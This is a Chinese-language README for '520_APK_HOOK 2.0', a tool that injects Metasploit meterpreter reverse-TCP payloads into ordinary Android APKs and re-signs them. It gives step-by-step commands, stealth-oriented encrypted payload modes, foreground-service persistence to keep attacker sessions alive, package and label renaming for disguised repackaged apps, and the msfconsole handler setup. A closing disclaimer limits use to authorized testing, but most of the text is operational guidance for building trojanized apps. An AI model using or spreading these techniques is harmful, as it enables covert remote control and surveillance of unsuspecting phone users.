# 520_APK_HOOK 2.0

> 把 Metasploit payload 注入任意 Android APK，重打包并重新签名。
> 版本：**2.0.0（Android 17 Ready）**
> 适用：Android 5.0 ~ 17（API 21 ~ 37，具体看所选模式，见 [兼容矩阵](#6-真机兼容矩阵)）
> 一键装依赖：`python install.py`（Windows 用 `install.bat`，Linux/macOS 用 `./install.sh`）

---

## 1. 它是什么

给它一个正常的 APK，它输出一个「打开就能连回你的 handler」的 APK：

1. 解包 APK，读取 `AndroidManifest.xml`（二进制 AXML，纯 Python 就地改写，不重新编码）；
2. 按所选模式注入 payload（可选：换成加固壳、把宿主 dex 加密藏起来、加前台服务保活）；
3. 修好 Android 11 ~ 17 的安装期/运行期硬性要求（对齐、16KB 页、targetSdk、exported）；
4. 用 `apksigner` 重新签名，产出 `WorkDir/AllFinish.apk` + `handler.rc` + `report.json`。

### 1.1 与最初版本（1.x）的对比

| 维度 | 最初版本 1.1 | 现在 2.0 |
|---|---|---|
| 能装的 Android | 到 Android 10 左右（`resources.arsc` 压缩、`.so` 4KB 页对齐 → 新系统直接装不上） | **Android 11 ~ 17 可安装**（arsc STORE + 4 字节对齐、`.so` 16KB 页对齐、targetSdk 自动抬高、v1/v2/v3 签名） |
| 能跑的 Android | 装上后大概率闪退（壳里 12 处判断写反、dex 永远加载不进来） | **Android 13 / 17 真机逐模式实测**，见兼容矩阵 |
| 宿主 dex | 用 baksmali→smali 往返后重编译，遇到 ktor 等库会 `IncompatibleClassChangeError` | **一个字节都不动**（模式 2/4/5/6）；只有模式 1/3 会加密搬走 |
| 加密 dex 放哪 | 加密后仍叫 `classesN.dex` 放根目录 → ART 打开 APK 就失败 | 放进 `assets/apkhook/dex/*.bin`，运行时解出来 |
| 大小写重名条目 | Windows/macOS 解包会互相覆盖，重打包丢 300+ 条目 → 资源错乱闪退 | `_apkhook_dup/` 隔离 + `namemap.json` 还原文件名，逐条 CRC 校验 0 差异 |
| 注入代码 | 生成的 smali 带字面 `{p0}`、插在 `.locals` 之前 → 汇编必失败 | 注入点自动选 Application/launcher Activity，指令插在 `.locals` 之后，payload 独立 dex 避免 64K 超限 |
| 多 dex | `classes(\d)` 正则算名字，覆盖原 dex | 按编号倒序整体 +1 改名，壳/dex 槽位严格排序 |
| MSF 会话 | 连上即 `not valid` / `Reason: Died`：stage 落在可写目录（Android 14+ 拒绝）、配置格式过时 | stage 写成**只读**再 `DexClassLoader`；配置改成 meterpreter **TLV** 格式（上游 `ConfigParser` 验证 `PARSE_OK`） |
| 后台存活 | 切后台几十秒就被系统回收 | 前台服务保活（模式 1/2/5/6），实测切桌面 90 秒仍在 |
| 排障 | 崩了没有任何日志 | 壳日志 `Android/data/<包名>/files/steady.log`、注入探针 `apkhook_probe.log`、`tools/fake_handler.py` 本地验证 MSF 链路 |
| 依赖准备 | 手工装 Python 包、自己找 JDK | `install.py` 一键体检/装依赖/下载 JDK/生成 env 脚本 |
| 自测 | 无 | `tests/test_e2e.py` 41 组端到端用例（5 种 APK 形态 × 5 模式 + 12 组回归） |

---

## 2. 环境要求

| 项目 | 要求 |
|---|---|
| Python | 3.8+（`rich`、`pycryptodome`） |
| Java | 11+（推荐 17，`apksigner`/`baksmali`/`smali` 都要） |
| 系统 | Windows / Linux / macOS 均可（纯 Python + jar，无 Android SDK 依赖） |

### 2.1 一键安装依赖

```bash
# Windows（cmd 或 PowerShell，自动挑 py -3 / python / python3）
install.bat

# Linux / macOS / WSL
chmod +x install.sh && ./install.sh

# 任意平台
python install.py
```

`install.py` 会依次做 6 件事：

```text
1. 查 Python 版本与 pip
2. 查/装 rich、pycryptodome（国内自动走清华/阿里镜像，失败自动换源）
3. 找 Java：JAVA_HOME / PATH / 常见安装目录 / tools/jdk
4. 校验 libs/jar/*.jar 能真正加载
5. 生成 tools/env.sh、tools/env.bat、tools/env.ps1
6. 冒烟跑 main.py --about
```

| 参数 | 作用 |
|---|---|
| `--check` | 只体检，不装、不改文件（退出码 0 正常 / 1 有缺失 / 2 有致命项） |
| `--venv [DIR]` | 在虚拟环境里装（默认 `.venv`） |
| `--mirror aliyun\|tuna\|ustc\|tencent\|pypi` | 指定 pip 镜像，仍会自动补备选源 |
| `--install-java` | 本机没有 Java 时，下载 Temurin JDK 17 到 `tools/jdk` 并写回 `JAVA_HOME` |
| `--json` | 机器可读的体检结果 |

不想用脚本也行：`pip install -r requirements.txt`。

---

## 3. 使用

```bash
# 最常用：零改 dex + 加密 payload（Android 8+），起好 handler 后启动 App 即可
python main.py -n app.apk -m 6 --lhost 192.0.2.10 --lport 4444

# 只看这个包是什么情况、能不能装、有没有 4KB 页 .so（不改文件；有问题退出码 2）
python main.py -n app.apk --analyze

# 只看计划，不生成 APK
python main.py -n app.apk -m 6 --lhost 192.0.2.10 --lport 4444 --dry-run

# 马甲包：改包名 + 改显示名 + 4 并发 + 落日志
python main.py -n app.apk -m 6 --lhost 192.0.2.10 --lport 4444 \
  --rename-package com.new.pkg --label "新名字" --jobs 4 --log run.log
```

产物：

| 文件 | 说明 |
|---|---|
| `WorkDir/AllFinish.apk` | 注入后的成品 APK（未签名时不含签名） |
| `WorkDir/handler.rc` | 直接给 msfconsole 用的 resource 脚本 |
| `WorkDir/report.json` | 全过程报告：清单改动、注入点、dex 布局、校验结果、耗时 |
| `Android/data/<包名>/files/steady.log` | 壳日志（模式 1/3），真机排障用 |
| `Android/data/<包名>/files/apkhook_probe.log` | 注入探针日志（模式 2/5/6） |

### 3.1 起监听

```bash
msfconsole -r WorkDir/handler.rc
# 等价于：
#   use exploit/multi/handler
#   set PAYLOAD android/meterpreter/reverse_tcp
#   set LHOST 192.0.2.10
#   set LPORT 4444
#   set ExitOnSession false
#   exploit -j
```

---

## 4. 六种模式

| 模式 | 做什么 | 宿主 dex | 后台保活 | 可用 Android |
|---|---|---|---|---|
| `-m 1` | 换壳 + 宿主 dex 加密 + payload 加密，壳反射启动 payload | 加密搬进 assets | ✅ | **仅 5.0 ~ 9** |
| `-m 2` | 不换壳；明文 payload dex + ContentProvider 起 payload | 逐字节不变 | ✅ | 5.0 ~ 17 |
| `-m 3` | 只换壳加固，不注入 payload | 加密搬进 assets | — | **仅 5.0 ~ 9** |
| `-m 4` | 只整备：不改功能，只修安装/运行兼容性并重签 | 逐字节不变 | — | 5.0 ~ 17 |
| `-m 5` | 零改 dex：明文 payload 走 provider 注入 | 逐字节不变 | ✅ | 5.0 ~ 17 |
| `-m 6` | 零改 dex + payload 加密进 `assets/apkhook/payload.bin`，运行时 `InMemoryDexClassLoader` 加载 | 逐字节不变 | ✅ | **8.0 ~ 17（推荐）** |

### 4.1 怎么选

```
先跑 --analyze 看包有没有问题
├─ 只想让老包在新系统能装能开   → -m 4
├─ 要 payload，设备是 Android 8+ → -m 6（推荐，隐蔽性最好）
├─ 要 payload，设备是 Android 5~7→ -m 5（payload 明文）
└─ 目标是 Android 5.0~9 的老机器 → -m 1（唯一会加密宿主 dex 的模式）
```

`--mode-help` 会把上面这些差异直接打出来（含每个模式的优点/缺点/坑）。

### 4.2 兼容自查

`-m 6` 遇到 minSdk < 26 时，默认自动降级：

```text
payload 改成明文 dex 追加（等价 -m 5，功能不变）
report.json 里写 payload_encrypted_fallback: true
命令行会打印「已自动降级」
```

不想被降级、宁可报错退出：加 `--strict-compat`。

想让低版本机器也走内存加载：用 `--min-sdk 26` 把清单 minSdk 抬上去。

`-m 1` / `-m 3` 会打印「仅 Android 5.0 ~ 9」：

```text
Android 10 起 VMRuntime.setHiddenApiExemptions 对普通 App 全部 denied
壳拿不到 DexPathList，宿主 dex 注入不进去（Android 13 / 17 真机实测均崩）
```

### 4.3 全部参数

| 参数 | 说明 |
|---|---|
| `-n, --normal-apk` | 要处理的 APK（必填） |
| `-m, --mode {1..6}` | 工作模式，见上表（默认 1） |
| `-p, --payload` | payload 类型：`tcp`（默认）/`http`/`https` |
| `--lhost / --lport` | 回连地址/端口（模式 1/2/5/6 必填） |
| `-o, --output` | 输出路径（默认 `WorkDir/AllFinish.apk`） |
| `--min-sdk / --target-sdk` | 覆盖清单值；`-m 4` 常用（`targetSdk` 低于 24 会被系统拒装） |
| `--page-align` | `.so` 对齐粒度，默认 `0x4000`（16KB 页） |
| `--no-store-libs` | 不强制把 `lib/**/*.so` 存为 STORE（默认存，兼容 `extractNativeLibs=false`） |
| `--no-fix-app-libs` | 不修 App 自带 `.so` 的 4KB 页对齐 |
| `--rename-package` | 马甲包：改 `package`；类名只补全成绝对名，dex 里类路径不动 |
| `--label` | 改 `android:label`（显示名） |
| `--debuggable / --no-debuggable` | 清单 `android:debuggable` |
| `--analyze` | 只体检（zip 完整性、对齐、ELF、dex、签名、兼容矩阵），有问题退出码 2 |
| `--dry-run` | 只打印计划 |
| `--jobs N` | 并行度（反编译/回编译/加密），默认 `min(4, CPU)` |
| `--log FILE` / `--quiet` | 全部输出落文件 / 只留关键行 |
| `--seed` | 固定随机化种子（类名可复现） |
| `--java` | 指定 java 可执行文件 |
| `--keystore / --ks-pass / --key-pass` | 换签名密钥（默认 `libs/520.keystore`，密码 `520ApkHook`） |
| `--no-sign / --no-v1 / --no-v2 / --no-v3` | 跳过签名 / 关闭对应签名方案 |
| `--keep-workdir` | 保留中间产物 |
| `--strict-compat` | 兼容问题直接报错，不自动降级 |
| `--no-payload-start` | 排障：只装注入探针，不启动 payload |
| `--mode-help` / `--about` | 打印模式说明 / 版本与归属 |

---

## 5. 校验与自测（不用装手机也能看结论）

```bash
# 体检成品（对齐、ELF、dex 明文/密文、签名、兼容矩阵），有结论就打印
python utils/ApkVerifier.py WorkDir/AllFinish.apk

# 单独查/修 .so 的 16KB 页对齐（Android 15+ 必需）
python utils/ElfAlign.py check --dir some_dir
python utils/ElfAlign.py align --dir some_dir --page-size 16384

# 端到端自测：5 种 APK 形态 × 5 种模式 + 12 组回归，共 41 组
python tests/test_e2e.py            # 全量
python tests/test_e2e.py base noapp # 只跑指定形态

# 重编壳 dex（改 libs/ShellDexDir/src 下的 smali 之后）
python tools/build_shell.py         # 自动备份 .bak，并做往返自检
```

---

## 6. 真机兼容矩阵

同一套产物在两台真机上逐模式装机 + 启动 + 抓日志验证（`tools/fake_handler.py` 起假 handler + stub stage，验证 payload 真的连上并被执行）：

| 模式 | Android 13（PEQM00 / ColorOS 13 / SDK 33） | Android 17（M098FE / SDK 37） |
|---|---|---|
| `-m 1` | ❌ 隐藏 API denied，宿主 dex 加载不进来 | ❌ 同因 |
| `-m 2` | ✅ 前台服务 1，payload 连上 | ✅ |
| `-m 3` | ❌ 同模式 1 | ❌ |
| `-m 4` | ✅ | ✅ |
| `-m 5` | ✅ 前台服务 1，payload 连上 | ✅ |
| `-m 6` | ✅ 前台服务 1，stage 内存加载成功 | ✅ |

后台保活（`-m 6`，Android 13）：切到桌面 90 秒后进程存活、`startForegroundCount=1`、TCP 连接仍在。

---

## 7. 目录结构

```
main.py                  CLI 与全流程编排（解包→注入→清单→打包→签名→自检）
install.py/.sh/.bat      一键安装依赖、下载 JDK、生成 env 脚本
requirements.txt         rich / pycryptodome
utils/
  config.py              版本、路径、权限、签名、对齐等全局选项
  AxmlEdit.py            纯 Python 二进制 AXML 读写（保留 resource-id 引用）
  ManifestTools.py       清单读取/改写/包名迁移/组件 exported 补齐
  ApkZipper.py           zipalign 语义打包 + 安全解包（含大小写重名条目隔离）
  ElfAlign.py            .so 16KB 页对齐（改 PT_LOAD/PT_DYNAMIC 与 section 偏移）
  MultiDex.py            classesN.dex 编号/重排/明文密文判定
  InjectMsf2App.py       payload 类名随机化、guard 生成、注入点选择
  ProviderInject.py      provider/loader/探针/保活服务模板
  MsfConfig.py           meterpreter TLV 配置生成与校验
  CreateMsfDex.py        把配置写进 payload dex（修 dex 头校验和）
  EncryptFile.py / FsSafe.py / Tools.py / ApkVerifier.py / CustomPrint.py ...
libs/
  ShellDexDir/           壳 dex + 壳 smali 源码 + 4 ABI 的 libsteady-lib.so
  MsfDexDir/classes.dex  内置安卓 stager（已修 Android 14+ 只读加载）
  jar/                   baksmali / smali / apksigner / xml2axml
  520.keystore           默认签名证书（密码 520ApkHook）
tools/
  build_shell.py         由 smali 编回壳 dex
  patch_stager.py        给 stager 打 setReadOnly + 异常日志补丁
  fake_handler.py        本地假 handler，验证 MSF 链路（不需要真 msf）
tests/test_e2e.py        端到端自测
```

---

## 8. 常见问题

**Q: 装不上（`INSTALL_FAILED_...`）？**
先跑 `--analyze` 看它报什么，然后对照系统侧的拒装规则：

```text
Android 11+   resources.arsc 被压缩       必须 STORE + 4 字节对齐
Android 14+   targetSdk <= 22            必须 >= 24
Android 15+   4KB 页对齐的 .so            必须走 16KB 链路（本工具自动修）
Android 15+   targetSdk < 24             必须 >= 24
```

本工具默认把这些全修好；`--no-fix-app-libs`、`--no-store-libs` 会把修复关掉，别关。

**Q: 装上打开就闪退？**
按顺序看三步：

```bash
python main.py -n app.apk --analyze                  # ① 有没有 4KB 页 .so / 签名问题
adb logcat -s steady:* apkhook:* AndroidRuntime:E    # ② 有没有 steady: / apkhook: 行
```

③ 拿到异常后对号入座：

```text
ClassNotFoundException   dex 没加载进来（模式 1/3 在 Android 10+ 必崩，换 -m 6）
UnsatisfiedLinkError     ABI 不全
无栈直接 finish          原 App 自己的签名校验
```

**Q: MSF 里 `Sending stage` 之后立刻 `not valid` / `Reason: Died`？**
2.0 已修两处：

```text
stage 先 setReadOnly() 再 DexClassLoader   # Android 14+ 只允许从不可写文件加载代码
payload 配置改成 meterpreter TLV 格式       # 老版本写定长块，现代 stage 解析时抛 NegativeArraySizeException
```

不装 msf 也能验证链路，本地起一个假 handler 看 stager 有没有把 stage 拉起来：

```bash
python tools/fake_handler.py 4444 com.apkhook.stage.Stage stage.dex
# 手机端看到 stage: started ok 就说明 stager 侧没问题，剩下的归 msf 管
```

**Q: 前台正常，一退后台会话就断？**
2.0 会给模式 1/2/5/6 装一个前台服务保活：清单里写 foregroundServiceType=dataSync，并补 POST_NOTIFICATIONS 等权限。

判定两步：

```bash
adb shell dumpsys activity services <包名> | grep startForegroundCount   # 应为 1
Get-NetTCPConnection -LocalPort 4444                                     # 切后台 90 秒后仍有 Established
```

模式 3、模式 4 没有 payload，不需要保活。

**Q: 国产 ROM 上还不稳？**
关掉电池优化（设置里给 App 关「省电策略/后台限制」），部分 ROM 需要允许「自启动」。

**Q: `--rename-package` 之后 App 有功能异常？**
包名改了，但 dex 里的类路径不跟着改——改了必然 ClassNotFoundException，所以工具只把清单里的相对类名补全成原包名的全限定名。

会同步替换的：authorities、process、permission、targetPackage、taskAffinity 等字符串属性（按 token 边界，不会误伤子串）。

需要自测的：原 App 自己用包名做签名校验、推送注册、埋点归类这类硬编码判断。

**Q: 壳日志在哪？**
`Android/data/<包名>/files/steady.log`（模式 1/3）与 `apkhook_probe.log`（模式 2/5/6）。连电脑时 `adb pull /sdcard/Android/data/<包名>/files/steady.log`。

---

## 9. 壳 dex 重新编译

```bash
# 改完 libs/ShellDexDir/src/com/sakuqi/steady/*.smali 之后
python tools/build_shell.py            # 汇编 + 三项符号断言 + baksmali 往返自检
python tools/build_shell.py --check    # 只校验，不覆盖
```

壳的约束（改的时候别踩）：

```text
decrypt([B)[B        必须保留，JNI 按方法名绑定，改名壳就废
SteadyApplication    必须 extends android.app.Application
跨类调用              必须 public static
invoke-*             只能编码 v0..v15；2 参静态方法 .locals 不要超过 14
```

改了壳源码之后不要手写 dex，一律走上面的 `build_shell.py`，它会做汇编 + 符号断言 + 往返自检。

---

## 10. 作者与来源

原作者 / 1.x 版权：BaoGuo（cleverbao@outlook.com），原项目 https://github.com/cleverbao/520apkhook ，2021 年初版，注入与加固壳的整体思路出自其手。

2.0 维护：huocai250（1332334007@qq.com），本项目 https://github.com/huocai250/apkhook520 。

版权归属保持原样；许可证沿用 Apache License 2.0。

## 11. 致谢

apk-steady / apk-jiagu（加固壳思路）、APK Infector、baksmali / smali、apksigner、xml2axml。

## 12. 免责声明

本项目仅用于**已获授权的安全测试、渗透测试与教学研究**。请只在你拥有或已获得书面授权的设备与 App 上使用；不得用于未经授权的侵入、监控或任何违法用途。使用者需自行承担因使用本工具产生的一切后果与法律责任。
